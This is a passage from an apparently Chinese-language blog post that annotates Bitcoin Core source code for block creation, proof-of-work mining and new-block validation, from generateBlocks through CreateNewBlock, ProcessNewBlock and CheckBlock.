class="string">&quot;Error: Invalid address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    NodeContext&amp; node = <span class="built_in">EnsureAnyNodeContext</span>(request.context);</span><br><span class="line">    <span class="type">const</span> CTxMemPool&amp; mempool = <span class="built_in">EnsureMemPool</span>(node);</span><br><span class="line">    ChainstateManager&amp; chainman = <span class="built_in">EnsureChainman</span>(node);</span><br><span class="line"></span><br><span class="line">    CScript coinbase_script = <span class="built_in">GetScriptForDestination</span>(destination);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开始创建区块</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">generateBlocks</span>(chainman, mempool, coinbase_script, num_blocks, max_tries);</span><br><span class="line">&#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进行一系列检查后，它将调用同在<code>src\rpc\mining.cpp</code>中的<code>generateBlocks</code>函数，它是创建区块的入口函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> UniValue <span class="title">generateBlocks</span><span class="params">(ChainstateManager&amp; chainman, <span class="type">const</span> CTxMemPool&amp; mempool, <span class="type">const</span> CScript&amp; coinbase_script, <span class="type">int</span> nGenerate, <span class="type">uint64_t</span> nMaxTries)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> nHeightEnd = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> nHeight = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#123;   <span class="comment">// Don&#x27;t keep cs_main locked</span></span><br><span class="line">        <span class="built_in">LOCK</span>(cs_main);</span><br><span class="line">        <span class="comment">// 区块链当前高度</span></span><br><span class="line">        nHeight = chainman.<span class="built_in">ActiveChain</span>().<span class="built_in">Height</span>();</span><br><span class="line">        <span class="comment">// 创建nGenerate个区块后的高度</span></span><br><span class="line">        nHeightEnd = nHeight+nGenerate;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nExtraNonce = <span class="number">0</span>;</span><br><span class="line">    <span class="function">UniValue <span class="title">blockHashes</span><span class="params">(UniValue::VARR)</span></span>;</span><br><span class="line">    <span class="comment">// 开始构造区块并挖矿</span></span><br><span class="line">    <span class="keyword">while</span> (nHeight &lt; nHeightEnd &amp;&amp; !<span class="built_in">ShutdownRequested</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 调用 BlockAssembler::CreateNewBlock 构造候选区块</span></span><br><span class="line">        <span class="comment">// chainman.ActiveChainstate()会获取当前最长链，新区块将会基于最长链延续</span></span><br><span class="line">        <span class="function">std::unique_ptr&lt;CBlockTemplate&gt; <span class="title">pblocktemplate</span><span class="params">(BlockAssembler(chainman.ActiveChainstate(), mempool, Params()).CreateNewBlock(coinbase_script))</span></span>;</span><br><span class="line">        <span class="keyword">if</span> (!pblocktemplate.<span class="built_in">get</span>())</span><br><span class="line">            <span class="keyword">throw</span> <span class="built_in">JSONRPCError</span>(RPC_INTERNAL_ERROR, <span class="string">&quot;Couldn&#x27;t create new block&quot;</span>);</span><br><span class="line">        CBlock *pblock = &amp;pblocktemplate-&gt;block;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用GenerateBlock进行挖矿：遍历区块的nonce值，使得区块哈希值满足工作量证明</span></span><br><span class="line">        uint256 block_hash;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">GenerateBlock</span>(chainman, *pblock, nMaxTries, nExtraNonce, block_hash)) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!block_hash.<span class="built_in">IsNull</span>()) &#123;</span><br><span class="line">            ++nHeight;</span><br><span class="line">            blockHashes.<span class="built_in">push_back</span>(block_hash.<span class="built_in">GetHex</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> blockHashes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数调用了两个关键函数：</p>
<h3 id="CreateNewBlock"><a href="#CreateNewBlock" class="headerlink" title="CreateNewBlock"></a>CreateNewBlock</h3><p><code>src\miner.cpp</code>中的<code>BlockAssembler::CreateNewBlock</code>函数，用于构造候选区块：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">std::unique_ptr&lt;CBlockTemplate&gt; <span class="title">BlockAssembler::CreateNewBlock</span><span class="params">(<span class="type">const</span> CScript&amp; scriptPubKeyIn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int64_t</span> nTimeStart = <span class="built_in">GetTimeMicros</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">resetBlock</span>();</span><br><span class="line"></span><br><span class="line">    pblocktemplate.<span class="built_in">reset</span>(<span class="keyword">new</span> <span class="built_in">CBlockTemplate</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!pblocktemplate.<span class="built_in">get</span>())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    CBlock* <span class="type">const</span> pblock = &amp;pblocktemplate-&gt;block; <span class="comment">// pointer for convenience</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add dummy coinbase tx as first transaction</span></span><br><span class="line">    <span class="comment">// 1. 区块中的第一个位置留给coinbase交易</span></span><br><span class="line">    pblock-&gt;vtx.<span class="built_in">emplace_back</span>();</span><br><span class="line">    pblocktemplate-&gt;vTxFees.<span class="built_in">push_back</span>(<span class="number">-1</span>); <span class="comment">// updated at end</span></span><br><span class="line">    pblocktemplate-&gt;vTxSigOpsCost.<span class="built_in">push_back</span>(<span class="number">-1</span>); <span class="comment">// updated at end</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">LOCK2</span>(cs_main, m_mempool.cs);</span><br><span class="line">    <span class="comment">// 2. 取当前区块链的最后一个节点，作为新区块的父区块</span></span><br><span class="line">    CBlockIndex* pindexPrev = m_chainstate.m_chain.<span class="built_in">Tip</span>();</span><br><span class="line">    <span class="built_in">assert</span>(pindexPrev != <span class="literal">nullptr</span>);</span><br><span class="line">    nHeight = pindexPrev-&gt;nHeight + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 计算区块版本</span></span><br><span class="line">    pblock-&gt;nVersion = g_versionbitscache.<span class="built_in">ComputeBlockVersion</span>(pindexPrev, chainparams.<span class="built_in">GetConsensus</span>());</span><br><span class="line">    <span class="comment">// -regtest only: allow overriding block.nVersion with</span></span><br><span class="line">    <span class="comment">// -blockversion=N to test forking scenarios</span></span><br><span class="line">    <span class="keyword">if</span> (chainparams.<span class="built_in">MineBlocksOnDemand</span>())</span><br><span class="line">        pblock-&gt;nVersion = gArgs.<span class="built_in">GetArg</span>(<span class="string">&quot;-blockversion&quot;</span>, pblock-&gt;nVersion);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 计算时间戳</span></span><br><span class="line">    pblock-&gt;nTime = <span class="built_in">GetAdjustedTime</span>();</span><br><span class="line">    <span class="type">const</span> <span class="type">int64_t</span> nMedianTimePast = pindexPrev-&gt;<span class="built_in">GetMedianTimePast</span>();</span><br><span class="line"></span><br><span class="line">    nLockTimeCutoff = (STANDARD_LOCKTIME_VERIFY_FLAGS &amp; LOCKTIME_MEDIAN_TIME_PAST)</span><br><span class="line">                       ? nMedianTimePast</span><br><span class="line">                       : pblock-&gt;<span class="built_in">GetBlockTime</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decide whether to include witness transactions</span></span><br><span class="line">    <span class="comment">// This is only needed in case the witness softfork activation is reverted</span></span><br><span class="line">    <span class="comment">// (which would require a very deep reorganization).</span></span><br><span class="line">    <span class="comment">// Note that the mempool would accept transactions with witness data before</span></span><br><span class="line">    <span class="comment">// the deployment is active, but we would only ever mine blocks after activation</span></span><br><span class="line">    <span class="comment">// unless there is a massive block reorganization with the witness softfork</span></span><br><span class="line">    <span class="comment">// not activated.</span></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> replace this with a call to main to assess validity of a mempool</span></span><br><span class="line">    <span class="comment">// transaction (which in most cases can be a no-op).</span></span><br><span class="line">    fIncludeWitness = <span class="built_in">DeploymentActiveAfter</span>(pindexPrev, chainparams.<span class="built_in">GetConsensus</span>(), Consensus::DEPLOYMENT_SEGWIT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 从交易池中选择一批交易打包到区块中（注意：并不会从交易持中将交易删除，删除需要等区块确认以后）</span></span><br><span class="line">    <span class="type">int</span> nPackagesSelected = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> nDescendantsUpdated = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">addPackageTxs</span>(nPackagesSelected, nDescendantsUpdated);</span><br><span class="line"></span><br><span class="line">    <span class="type">int64_t</span> nTime1 = <span class="built_in">GetTimeMicros</span>();</span><br><span class="line"></span><br><span class="line">    m_last_block_num_txs = nBlockTx;</span><br><span class="line">    m_last_block_weight = nBlockWeight;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 生成铸币交易</span></span><br><span class="line">    <span class="comment">// Create coinbase transaction.</span></span><br><span class="line">    CMutableTransaction coinbaseTx;</span><br><span class="line">    coinbaseTx.vin.<span class="built_in">resize</span>(<span class="number">1</span>);</span><br><span class="line">    coinbaseTx.vin[<span class="number">0</span>].prevout.<span class="built_in">SetNull</span>();</span><br><span class="line">    coinbaseTx.vout.<span class="built_in">resize</span>(<span class="number">1</span>);</span><br><span class="line">    coinbaseTx.vout[<span class="number">0</span>].scriptPubKey = scriptPubKeyIn;</span><br><span class="line">    <span class="comment">// 矿工奖励=区块中交易费用总和（在addPackageTxs时会进行统计）+系统发放奖励</span></span><br><span class="line">    coinbaseTx.vout[<span class="number">0</span>].nValue = nFees + <span class="built_in">GetBlockSubsidy</span>(nHeight, chainparams.<span class="built_in">GetConsensus</span>());</span><br><span class="line">    coinbaseTx.vin[<span class="number">0</span>].scriptSig = <span class="built_in">CScript</span>() &lt;&lt; nHeight &lt;&lt; OP_0;</span><br><span class="line">    pblock-&gt;vtx[<span class="number">0</span>] = <span class="built_in">MakeTransactionRef</span>(std::<span class="built_in">move</span>(coinbaseTx));</span><br><span class="line">    pblocktemplate-&gt;vchCoinbaseCommitment = <span class="built_in">GenerateCoinbaseCommitment</span>(*pblock, pindexPrev, chainparams.<span class="built_in">GetConsensus</span>());</span><br><span class="line">    pblocktemplate-&gt;vTxFees[<span class="number">0</span>] = -nFees;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">LogPrintf</span>(<span class="string">&quot;CreateNewBlock(): block weight: %u txs: %u fees: %ld sigops %d\n&quot;</span>, <span class="built_in">GetBlockWeight</span>(*pblock), nBlockTx, nFees, nBlockSigOpsCost);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 填充区块头</span></span><br><span class="line">    <span class="comment">// Fill in header</span></span><br><span class="line">    pblock-&gt;hashPrevBlock  = pindexPrev-&gt;<span class="built_in">GetBlockHash</span>();</span><br><span class="line">    <span class="built_in">UpdateTime</span>(pblock, chainparams.<span class="built_in">GetConsensus</span>(), pindexPrev);</span><br><span class="line">    <span class="comment">// 设置新区块的工作量难度目标值</span></span><br><span class="line">    pblock-&gt;nBits          = <span class="built_in">GetNextWorkRequired</span>(pindexPrev, pblock, chainparams.<span class="built_in">GetConsensus</span>());</span><br><span class="line">    pblock-&gt;nNonce         = <span class="number">0</span>;</span><br><span class="line">    pblocktemplate-&gt;vTxSigOpsCost[<span class="number">0</span>] = WITNESS_SCALE_FACTOR * <span class="built_in">GetLegacySigOpCount</span>(*pblock-&gt;vtx[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    BlockValidationState state;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">TestBlockValidity</span>(state, chainparams, m_chainstate, *pblock, pindexPrev, <span class="literal">false</span>, <span class="literal">false</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> std::<span class="built_in">runtime_error</span>(<span class="built_in">strprintf</span>(<span class="string">&quot;%s: TestBlockValidity failed: %s&quot;</span>, __func__, state.<span class="built_in">ToString</span>()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int64_t</span> nTime2 = <span class="built_in">GetTimeMicros</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">LogPrint</span>(BCLog::BENCH, <span class="string">&quot;CreateNewBlock() packages: %.2fms (%d packages, %d updated descendants), validity: %.2fms (total %.2fms)\n&quot;</span>, <span class="number">0.001</span> * (nTime1 - nTimeStart), nPackagesSelected, nDescendantsUpdated, <span class="number">0.001</span> * (nTime2 - nTime1), <span class="number">0.001</span> * (nTime2 - nTimeStart));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> std::<span class="built_in">move</span>(pblocktemplate);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="GenerateBlock"><a href="#GenerateBlock" class="headerlink" title="GenerateBlock"></a>GenerateBlock</h3><p><code>src\rpc\mining.cpp</code>中的<code>GenerateBlock</code>函数，用于挖矿:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">GenerateBlock</span><span class="params">(ChainstateManager&amp; chainman, CBlock&amp; block, <span class="type">uint64_t</span>&amp; max_tries, <span class="type">unsigned</span> <span class="type">int</span>&amp; extra_nonce, uint256&amp; block_hash)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    block_hash.<span class="built_in">SetNull</span>();</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">LOCK</span>(cs_main);</span><br><span class="line">        <span class="comment">// 在这个函数中会调用src\consensus\merkle.cpp中的BlockMerkleRoot函数</span></span><br><span class="line">        <span class="comment">// 计算区块MerkleRoot的值</span></span><br><span class="line">        <span class="built_in">IncrementExtraNonce</span>(&amp;block, chainman.<span class="built_in">ActiveChain</span>().<span class="built_in">Tip</span>(), extra_nonce);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">CChainParams <span class="title">chainparams</span><span class="params">(Params())</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历nonce值寻找工作量证明。</span></span><br><span class="line">    <span class="comment">// 调用src\pow.cpp中的CheckProofOfWork函数检查是否满足工作量证明，即区块哈希小于目标值</span></span><br><span class="line">    <span class="keyword">while</span> (max_tries &gt; <span class="number">0</span> &amp;&amp; block.nNonce &lt; std::numeric_limits&lt;<span class="type">uint32_t</span>&gt;::<span class="built_in">max</span>() &amp;&amp; !<span class="built_in">CheckProofOfWork</span>(block.<span class="built_in">GetHash</span>(), block.nBits, chainparams.<span class="built_in">GetConsensus</span>()) &amp;&amp; !<span class="built_in">ShutdownRequested</span>()) &#123;</span><br><span class="line">        ++block.nNonce;</span><br><span class="line">        --max_tries;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (max_tries == <span class="number">0</span> || <span class="built_in">ShutdownRequested</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (block.nNonce == std::numeric_limits&lt;<span class="type">uint32_t</span>&gt;::<span class="built_in">max</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用src\validation.cpp中的ChainstateManager::ProcessNewBlock函数</span></span><br><span class="line">    <span class="comment">// 处理新区块：验证区块、接收区块（链接到对应链上、广播到网络中等）、更新最长链</span></span><br><span class="line">    std::shared_ptr&lt;<span class="type">const</span> CBlock&gt; shared_pblock = std::<span class="built_in">make_shared</span>&lt;<span class="type">const</span> CBlock&gt;(block);</span><br><span class="line">    <span class="keyword">if</span> (!chainman.<span class="built_in">ProcessNewBlock</span>(chainparams, shared_pblock, <span class="literal">true</span>, <span class="literal">nullptr</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="built_in">JSONRPCError</span>(RPC_INTERNAL_ERROR, <span class="string">&quot;ProcessNewBlock, block not accepted&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    block_hash = block.<span class="built_in">GetHash</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="处理区块"><a href="#处理区块" class="headerlink" title="处理区块"></a>处理区块</h2><p>书接上文，创建区块之后，会调用<code>src\validation.cpp</code>中的<code>ChainstateManager::ProcessNewBlock</code>函数处理新区块。</p>
<p>同样，在接收到其它节点传播来的区块信息后，也会调用这个函数。“验证交易”一节中提到<code>src\net_processing.cpp</code>中的<code>PeerManagerImpl::ProcessMessage</code>函数用于处理从网络中接收到的信息，如果信息是区块类型，则会调用<code>PeerManagerImpl::ProcessBlock</code>函数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">PeerManagerImpl::ProcessMessage</span><span class="params">(CNode&amp; pfrom, <span class="type">const</span> std::string&amp; msg_type, CDataStream&amp; vRecv,</span></span></span><br><span class="line"><span class="params"><span class="function">                                     <span class="type">const</span> std::chrono::microseconds time_received,</span></span></span><br><span class="line"><span class="params"><span class="function">                                     <span class="type">const</span> std::atomic&lt;<span class="type">bool</span>&gt;&amp; interruptMsgProc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> (msg_type == NetMsgType::BLOCK)</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="built_in">ProcessBlock</span>(pfrom, pblock, forceProcessing);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而<code>PeerManagerImpl::ProcessBlock</code>函数则是直接调用<code>ChainstateManager::ProcessNewBlock</code>函数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">PeerManagerImpl::ProcessBlock</span><span class="params">(CNode&amp; node, <span class="type">const</span> std::shared_ptr&lt;<span class="type">const</span> CBlock&gt;&amp; block, <span class="type">bool</span> force_processing)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">bool</span> new_block&#123;<span class="literal">false</span>&#125;;</span><br><span class="line">    m_chainman.<span class="built_in">ProcessNewBlock</span>(m_chainparams, block, force_processing, &amp;new_block);</span><br><span class="line">    <span class="keyword">if</span> (new_block) &#123;</span><br><span class="line">        node.nLastBlockTime = <span class="built_in">GetTime</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">LOCK</span>(cs_main);</span><br><span class="line">        mapBlockSource.<span class="built_in">erase</span>(block-&gt;<span class="built_in">GetHash</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>src\validation.cpp</code>中的<code>ChainstateManager::ProcessNewBlock</code>函数是处理新区块的入口函数&#x2F;关键函数，它将主要负责：验证区块、接收区块、更新最长链。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ChainstateManager::ProcessNewBlock</span><span class="params">(<span class="type">const</span> CChainParams&amp; chainparams, <span class="type">const</span> std::shared_ptr&lt;<span class="type">const</span> CBlock&gt;&amp; block, <span class="type">bool</span> force_processing, <span class="type">bool</span>* new_block)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">AssertLockNotHeld</span>(cs_main);</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        CBlockIndex *pindex = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span> (new_block) *new_block = <span class="literal">false</span>;</span><br><span class="line">        BlockValidationState state;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CheckBlock() does not support multi-threaded block validation because CBlock::fChecked can cause data race.</span></span><br><span class="line">        <span class="comment">// Therefore, the following critical section must include the CheckBlock() call as well.</span></span><br><span class="line">        <span class="built_in">LOCK</span>(cs_main);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 验证区块</span></span><br><span class="line">        <span class="comment">// Skipping AcceptBlock() for CheckBlock() failures means that we will never mark a block as invalid if</span></span><br><span class="line">        <span class="comment">// CheckBlock() fails.  This is protective against consensus failure if there are any unknown forms of block</span></span><br><span class="line">        <span class="comment">// malleability that cause CheckBlock() to fail; see e.g. CVE-2012-2459 and</span></span><br><span class="line">        <span class="comment">// https://lists.linuxfoundation.org/pipermail/bitcoin-dev/2019-February/016697.html.  Because CheckBlock() is</span></span><br><span class="line">        <span class="comment">// not very expensive, the anti-DoS benefits of caching failure (of a definitely-invalid block) are not substantial.</span></span><br><span class="line">        <span class="type">bool</span> ret = <span class="built_in">CheckBlock</span>(*block, state, chainparams.<span class="built_in">GetConsensus</span>());</span><br><span class="line">        <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">            <span class="comment">// 2. 接收区块</span></span><br><span class="line">            <span class="comment">// Store to disk</span></span><br><span class="line">            ret = <span class="built_in">ActiveChainstate</span>().<span class="built_in">AcceptBlock</span>(block, state, &amp;pindex, force_processing, <span class="literal">nullptr</span>, new_block);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">            <span class="built_in">GetMainSignals</span>().<span class="built_in">BlockChecked</span>(*block, state);</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">error</span>(<span class="string">&quot;%s: AcceptBlock FAILED (%s)&quot;</span>, __func__, state.<span class="built_in">ToString</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">NotifyHeaderTip</span>(<span class="built_in">ActiveChainstate</span>());</span><br><span class="line"></span><br><span class="line">    BlockValidationState state; <span class="comment">// Only used to report errors, not invalidity - ignore it</span></span><br><span class="line">    <span class="comment">// 3. 更新当前链为最长链</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">ActiveChainstate</span>().<span class="built_in">ActivateBestChain</span>(state, block)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">error</span>(<span class="string">&quot;%s: ActivateBestChain failed (%s)&quot;</span>, __func__, state.<span class="built_in">ToString</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它主要调用如下三个函数。</p>
<h3 id="CheckBlock"><a href="#CheckBlock" class="headerlink" title="CheckBlock"></a>CheckBlock</h3><p><code>src\validation.cpp</code>中的<code>CheckBlock</code>函数，负责对区块进行检查：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fCheckPOW和fCheckMerkleRoot两个参数的默认值是true</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">CheckBlock</span><span class="params">(<span class="type">const</span> CBlock&amp; block, BlockValidationState&amp; state, <span class="type">const</span> Consensus::Params&amp; consensusParams, <span class="type">bool</span> fCheckPOW, <span class="type">bool</span> fCheckMerkleRoot)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// These are checks that are independent of context.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果区块已验证，则直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (block.fChecked)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 检查区块头，是否满足工作量证明</span></span><br><span class="line">    <span class="comment">// Check that the header is valid (particularly PoW).  This is mostly</span></span><br><span class="line">    <span class="comment">// redundant with the call in AcceptBlockHeader.</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">CheckBlockHeader</span>(block, state, consensusParams, fCheckPOW))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Signet only: check block solution</span></span><br><span class="line">    <span class="keyword">if</span> (consensusParams.signet_blocks &amp;&amp; fCheckPOW &amp;&amp; !<span class="built_in">CheckSignetBlockSolution</span>(block, consensusParams)) &#123;</span><br><span class="line">        <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(BlockValidationResult::BLOCK_CONSENSUS, <span class="string">&quot;bad-signet-blksig&quot;</span>, <span class="string">&quot;signet block signature validation failure&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 检查merkle root值是否正确</span></span><br><span class="line">    <span class="comment">// Check the merkle root.</span></span><br><span class="line">    <span class="keyword">if</span> (fCheckMerkleRoot) &#123;</span><br><span class="line">        <span class="type">bool</span> mutated;</span><br><span class="line">        uint256 hashMerkleRoot2 = <span class="built_in">BlockMerkleRoot</span>(block, &amp;mutated);</span><br><span class="line">        <span class="keyword">if</span> (block.hashMerkleRoot != hashMerkleRoot2)</span><br><span class="line">            <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(BlockValidationResult::BLOCK_MUTATED, <span class="string">&quot;bad-txnmrklroot&quot;</span>, <span class="string">&quot;hashMerkleRoot mismatch&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check for merkle tree malleability (CVE-2012-2459): repeating sequences</span></span><br><span class="line">        <span class="comment">// of transactions in a block without affecting the merkle root of a block,</span></span><br><span class="line">        <span class="comment">// while still invalidating it.</span></span><br><span class="line">        <span class="keyword">if</span> (mutated)</span><br><span class="line">            <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(BlockValidationResult::BLOCK_MUTATED, <span class="string">&quot;bad-txns-duplicate&quot;</span>, <span class="string">&quot;duplicate transaction&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// All potential-corruption validation must be done before we do any</span></span><br><span class="line">    <span class="comment">// transaction validation, as otherwise we may mark the header as invalid</span></span><br><span class="line">    <span class="comment">// because we receive the wrong transactions for it.</span></span><br><span class="line">    <span class="comment">// Note that witness malleability is checked in ContextualCheckBlock, so no</span></span><br><span class="line">    <span class="comment">// checks that use witness data may be performed here.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 检查区块大小是否在规定范围内</span></span><br><span class="line">    <span class="comment">// Size limits</span></span><br><span class="line">    <span class="keyword">if</span> (block.vtx.<span class="built_in">empty</span>() || block.vtx.<span class="built_in">size</span>() * WITNESS_SCALE_FACTOR &gt; MAX_BLOCK_WEIGHT || ::<span class="built_in">GetSerializeSize</span>(block, PROTOCOL_VERSION | SERIALIZE_TRANSACTION_NO_WITNESS) * WITNESS_SCALE_FACTOR &gt; MAX_BLOCK_WEIGHT)</span><br><span class="line">        <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(BlockValidationResult::BLOCK_CONSENSUS, <span class="string">&quot;bad-blk-length&quot;</span>, <span class="string">&quot;size limits failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 第一笔交易必须是coinbase交易，剩余的都不能是coinbase交易</span></span><br><span class="line">    <span class="comment">// First transaction must be coinbase, the rest must not be</span></span><br><span class="line">    <span class="keyword">if</span> (block.vtx.<span class="built_in">empty</span>() || !block.vtx[<span class="number">0</span>]-&gt;<span class="built_in">IsCoinBase</span>())</span><br><span class="line">        <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(BlockValidationResult::BLOCK_CONSENSUS, <span class="string">&quot;bad-cb-missing&quot;</span>, <span class="string">&quot;first tx is not coinbase&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt; block.vtx.<span class="built_in">size</span>(); i++)</span><br><span class="line">        <span class="keyword">if</span> (block.vtx[i]-&gt;<span class="built_in">IsCoinBase</span>())</span><br><span class="line">            <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(BlockValidationResult::BLOCK_CONSENSUS, <span class="string">&quot;bad-cb-multiple&quot;</span>, <span class="string">&quot;more than one coinbase&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 调用src\consensus\tx_check.cpp中的CheckTransaction函数（上文已介绍）检查每笔交易是否正确，</span></span><br><span class="line">    <span class="comment">// Check transactions</span></span><br><span class="line">    <span class="comment">// Must check for duplicate inputs (see CVE-2018-17144)</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; tx : block.vtx) &#123;</span><br><span class="line">        TxValidationState tx_state;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">CheckTransaction</span>(*tx, tx_state)) &#123;</span><br><span class="line">            <span class="comment">// CheckBlock() does context-free validation checks. The only</span></span><br><span class="line">            <span class="comment">// possible failures are consensus failures.</span></span><br><span class="line">            <span class="built_in">assert</span>(tx_state.<span class="built_in">GetResult</span>() == TxValidationResult::TX_CONSENSUS);</span><br><span class="line">            <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(BlockValidationResult::BLOCK_CONSENSUS, tx_state.<span class="built_in">GetRejectReason</span>(),</span><br><span class="line">                                 <span class="built_in">strprintf</span>(<span class="string">&quot;Transaction check failed (tx hash %s) %s&quot;</span>, tx-&gt;<span class="built_in">GetHash</span>().<span 